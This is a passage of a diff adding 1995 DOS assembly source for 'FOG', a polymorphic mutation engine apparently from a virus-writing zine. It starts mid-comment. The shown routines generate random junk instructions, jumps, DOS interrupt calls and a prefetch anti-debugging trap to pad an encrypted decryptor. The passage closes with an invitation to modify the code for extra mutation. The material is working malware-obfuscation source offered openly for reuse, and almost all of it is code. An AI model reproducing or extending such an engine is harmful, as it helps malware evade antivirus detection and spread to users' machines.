+;                  routine no1
+;                  ret
+;                  r2:
+;                  loop r3
+;                  routine no2
+;                  ret
+;                  r3:
+;                  loop r4
+;                  ......
+;                  end of routines.
+;
+;               3. The number in CX can be higher than
+;                  the amount of generation routines.
+;                  If so, whatever left in CX is used
+;                  as index into one-byte instruction
+;                  table.
+;
+;               4. To add another routine:
+;                  Make a routine creating an instruction
+;                  subgroup. It should be on the form:
+;
+;                  rx1:
+;                  loop rx2
+;                  generation routine
+;                  ret
+;                  rx2:
+;
+;
+;                  !NB Remember all these routines return to either sword
+;                  (stosw) or sbyte (stosb).
+;
+;                  After adding the routine, remove one of the one-byte
+;                  instructions in the one-byte table, pref.  one of the
+;                  extra nops. The new routine has now taken its place in
+;                  the index space.
+;
+;                  The rules for junk instructions in the decryptor are:
+;
+;                  1. They must not change registers that are used for
+;                  the functionality of the decryptor. You can check for
+;                  this at any time by putting register no. in al and
+;                  call reg_used, returning Z if used, or simply call
+;                  find_reg, which will return an unused register in al.
+;
+;                  2. AX can always be changed
+;
+;                  3. SP must never be changed.
+;
+;
+ proc flow_controller
+    mov  cl, 1fh
+    call rnd
+    lea  ax, [ bx + (offset sword - offset i_data) ]
+    push ax                                     ;return to sword
+
+    s1:                                         ;ÄÄÄÄÄÄÄ¿                       
+    loop s2                                     ;       ³
+    call find_reg                               ;       ³
+    call rnd_ax                                 ;       ³
+    and  ax, 073bh                              ;       ÃÄ and/add/adc/
+    or   ax, 0c003h                             ;       ³  sub/sbb/cmp/
+    mov  cl, 3                                  ;       ³  xor/or reg, reg
+    shl  dl, cl                                 ;       ³
+    or   ah, dl                                 ;       ³
+    ret                                         ;       ³
+						;ÄÄÄÄÄÄÄ´
+    s2:                                         ;       ³
+    loop s3                                     ;       ³
+    call rnd_ax                                 ;       ÃÄ and/add/adc/
+    and  al, 03ch                               ;       ³  sub/sbb/cmp/
+    or   al, 04                                 ;       ³  xor/or al, imm byte
+    ret                                         ;       ³
+						;ÄÄÄÄÄÄÄ´
+    s3:                                         ;       ³
+    loop s4                                     ;       ³
+    mov  cl, 3fh                                ;       ³
+    call rnd                                    ;       ³
+    and  al, 3dh                                ;       ³
+    or   al, 05h                                ;       ³
+    stosb                                       ;       ÃÄ and/add/adc/
+    rnd_ax:                                     ;       ³  sub/sbb/cmp/
+    call rnd_ff                                 ;       ³  xor/or ax, imm word
+    mov  dh, al                                 ;       ³
+    call rnd_ff                                 ;       ³
+    mov  ah, dh                                 ;       ³
+    ret                                         ;       ³
+						;ÄÄÄÄÄÄÄ´
+    s4:                                         ;       ³
+    loop s5                                     ;       ³
+    call find_reg                               ;       ³
+    cmp  al, rbx                                ;       ³
+    ja   s5_                                    ;       ÃÄ mov reg, imm byte
+    or   dl, 0b0                                ;       ³
+    call rnd_ax                                 ;       ³
+    mov  al, dl                                 ;       ³
+    ret                                         ;       ³
+						;ÄÄÄÄÄÄÄ´
+    s5:                                         ;       ³
+    loop s6                                     ;       ³
+    s5_:                                        ;       ³
+    call find_reg                               ;       ÃÄ mov reg, imm word
+    or   al, 0b8                                ;       ³
+    stosb                                       ;       ³
+    call rnd_ax                                 ;       ³
+    ret                                         ;       ³       
+						;ÄÄÄÄÄÄÄ´
+    s6:                                         ;       ³       
+    loop s7                                     ;       ³
+    call find_reg                               ;       ³
+    call rnd_07                                 ;       ÃÄ push reg, pop reg
+    mov  ah, dl                                 ;       ³
+    or   ax, 5850                               ;       ³
+    ret                                         ;       ³
+						;ÄÄÄÄÄÄÄ´
+    s7:                                         ;       ³
+    loop s8                                     ;       ³
+    test     [ id . in_switches         ], sw_nojmps;   ³
+    jnz  s5_                                    ;       ³
+    mov      [ id . lastjmp             ], di   ;       ³
+    or       [ id . in_switches         ], sw_nojmps;   ³
+    call rnd_ff                                 ;       ³
+    call rnd_z                                  ;       ÃÄ jmp short/
+    jz   conditional                            ;       ³  jmp on condition
+    mov  al, 0ebh                               ;       ³
+    ret                                         ;       ³
+    conditional:                                ;       ³
+    and  al, 0fh                                ;       ³
+    or   al, 70                                 ;       ³
+    ret                                         ;       ³       
+						;ÄÄÄÄÄÄÄ´       
+    s8:                                         ;       ³
+    loop s9                                     ;       ³
+    test     [ id . dh_switches         ], sw_use_ints; ³
+    jz   s9_                                    ;       ³
+    call rnd_07                                 ;       ³
+    add  al, (offset i_data.i_table - offset i_data)-1; ÃÄ mov ah, imm byte
+    xlat                                        ;       ³  int 21
+    mov  ah, al                                 ;       ³
+    mov  al, 0b4h                               ;       ³
+    stosw                                       ;       ³
+    mov  ax, 21cdh                              ;       ³
+    ret                                         ;       ³
+						;ÄÄÄÄÄÄÄ´
+    s9:                                         ;       ³
+    loop s10                                    ;       ³
+    s9_:                                        ;       ³
+    call find_reg                               ;       ³
+    call rnd_z                                  ;       ³
+    jnz  n_prefix                               ;       ³
+    call getseg                                 ;       ³
+    stosb                                       ;       ³
+    n_prefix:                                   ;       ³
+    call rnd_07                                 ;       ³
+    cmp  al, dl                                 ;       ³
+    jnz  n_equal                                ;       ³
+    dec  ax                                     ;       ³
+    n_equal:                                    ;       ³
+    mov  cl, 3                                  ;       ÃÄ mov reg, reg/
+    shl  dl, cl                                 ;       ³  mov reg, [m16]    
+    or   dl, al                                 ;       ³
+    mov  ah, dl                                 ;       ³
+    or   ah, 0c0                                ;       ³
+    mov  al, 8bh                                ;       ³
+    call rnd_z                                  ;       ³
+    jz   nodisp                                 ;       ³
+    or   ah, 06                                 ;       ³
+    and  ah, 03eh                               ;       ³
+    stosw                                       ;       ³
+    call rnd_ax                                 ;       ³
+    dec  ax                                     ;       ³
+    jnc  nodisp                                 ;       ³
+    dec  ax                                     ;       ³
+    nodisp:                                     ;       ³
+    ret                                         ;       ³
+						;ÄÄÄÄÄÄÄ´
+    s10:                                        ;       ³
+    loop s11                                    ;       ³
+    test     [ id . dh_switches         ], sw_prefetch; ³
+    jz   s9_                                    ;       ³
+    call getseg                                 ;       ³
+    stosb                                       ;       ³
+    mov  dx, 06c7h                              ;       ³
+    mov  ax, dx                                 ;       ³
+    stosw                                       ;       ³
+    lea  ax, [ di + 4                   ]       ;       ³
+    add  ax, [ id . dec_offset          ]       ;       ÃÄ prefetch trap
+    push ax                                     ;       ³       
+    stosw                                       ;       ³
+    mov  ax, 020cdh                             ;       ³
+    stosw                                       ;       ³
+    call getseg                                 ;       ³
+    stosb                                       ;       ³
+    mov  ax, dx                                 ;       ³
+    stosw                                       ;       ³
+    pop  ax                                     ;       ³
+    stosw                                       ;       ³
+    mov  ax, 0c72e                              ;       ³
+    ret                                         ;       ³
+						;ÄÄÄÄÄÄÄ´
+    s11:                                        ;       ³
+    loop s12                                    ;       ³
+    call find_reg                               ;       ³
+    call rnd_ax                                 ;       ÃÄ rol/ror/rcr/rcl
+    and  ax, 0d8d3h                             ;       ³  reg, 1/cl
+    or   ax, 0c0d1h                             ;       ³
+    or   ah, dl                                 ;       ³
+    ret                                         ;       ³
+						;ÄÄÄÄÄÄÄ´
+    s12:                                        ;       .
+    pop  ax                                     ;       .
+    lea  ax, [ bx + (offset sbyte - offset i_data) ];   . Return to sbyte
+    push ax                                     ;       .
+						;       .
+    loop s13                                    ;       ³
+    call find_reg                               ;       ÃÄ xchg ax, reg
+    or   al, 90                                 ;       ³
+    ret                                         ;       ³
+						;ÄÄÄÄÄÄÄ´
+    s13:                                        ;       ³       
+    loop store_one                              ;       ³
+    call find_reg                               ;       ³
+    call rnd_ff                                 ;       ÃÄ dec/inc reg
+    and  al, 08h                                ;       ³
+    or   al, dl                                 ;       ³
+    or   al, 40                                 ;       ³
+    ret                                         ;       ³
+						;ÄÄÄÄÄÄÄ´
+    store_one:                                  ;       ³
+    mov  ax, cx                                 ;       ÃÄ look up one byte
+    add  al, (offset i_data.onebytes - offset i_data)-1;³  instruction in table 
+    xlat                                        ;       ³
+    ret                                         ;ÄÄÄÄÄÄÄÙ       
+ endp flow_controller
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; Junk instructions
+ proc junk
+    push ax cx si
+    mov  cl, [ id . gb_switches         ]       ;cl==configured amount of
+    test cl, sw_001_gi                          ;junk
+    jz   @@1
+    and      [ id . in_switches         ], not sw_nojmps
+    or       [ id . lastjmp             ], -1   ;prime for jmp generation
+
+
+    call rnd                                    ;al/cl = [1..cl]
+    new_instr:                                  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+						;ÄÄÄÄÄÄÄ¿               ³
+    cmp  cl, 3                                  ;       ³               ³
+    ja   @@2                                    ;       ³               ³
+    or       [ id . in_switches         ], sw_nojmps;   ³               ³
+    @@2:                                        ;       ³               ³
+						;       ³               ³
+    mov  si, [ id . lastjmp             ]       ;       ³               ³
+    inc  si                                     ;       ³               ³
+    jz   @@5                                    ;       ³               ³
+    lea  ax, [ di - 1                   ]       ;       ³               ³
+    sub  ax, si                                 ;       ³               ³
+						;       ³               ³
+    or   al, al                                 ;       ³               ³
+    jz   @@5                                    ;       ÃÄ logistics    ³
+    cmp  ax, 007fh                              ;       ³  dealing with ³
+    ja   @@5                                    ;       ³  the junk     ³       
+    cmp  al, 70h                                ;       ³  jmps and how ÃÄ junk 
+    ja   @@3                                    ;       ³  they are     ³  loop
+    cmp  cl, 3                                  ;       ³  updated to   ³
+    jbe  @@4                                    ;       ³  show a proper³
+    call rnd_z                                  ;       ³  offset.      ³       
+    jnz  @@5                                    ;       ³               ³
+    @@3:                                        ;       ³               ³
+    and      [ id . in_switches         ],not sw_nojmps;³               ³
+    @@4:                                        ;       ³               ³
+    mov      [ es : si                  ], al   ;       ³               ³
+    @@5:                                        ;ÄÄÄÄÄÄÄÙ               ³
+						;                       ³
+						;                       ³
+    push cx                                     ;                       ³
+    call flow_controller                        ;gen. 1 junk instr.     ³
+    pop  cx                                     ;                       ³
+						;                       ³
+    loop new_instr                              ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ                       
+
+
+    @@1:
+    pop  si cx ax
+    ret                                         ;return: random amount (between 0 and
+						;the configured max number) of junk
+						;instr. in decryptor
+ endp junk
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+; Data work area
+ i_data datstruc <>
+
+ end_fog  = $+1
+
+ ends code
+
+ end
+
+
+
+;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+;
+; Feel free to modify this code in any way possible, as this
+; will add an extra level of mutation. However, please don't
+; use the name FOG on any modified versions. And; look out for
+; fog 2.0 coming soon to a zine near you.
+;
+; Eclipse, Queensland, June 1995
+; 
+;  
+;
+;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+
